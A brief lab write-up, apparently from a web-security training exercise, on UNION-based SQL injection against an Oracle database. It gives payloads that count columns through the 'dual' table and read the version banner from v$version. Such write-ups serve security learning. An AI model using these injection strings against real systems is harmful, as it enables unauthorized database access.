We know the server is Oracle. Every `SELECT` statement must use `FROM`. For this purpose Oracle has a table called `dual`. Our payload will use that.

[related link](https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm)

Starting by finding the number of columns.
```
' UNION SELECT NULL FROM dual --
' UNION SELECT NULL,NULL FROM dual --
```

[oracle docs - version](https://docs.oracle.com/cd/B14117_01/server.101/b10755/dynviews_2154.htm)

And by searching version query for Oracle 

```
' UNION SELECT NULL,banner FROM v$version --
```

we can complete the lab.
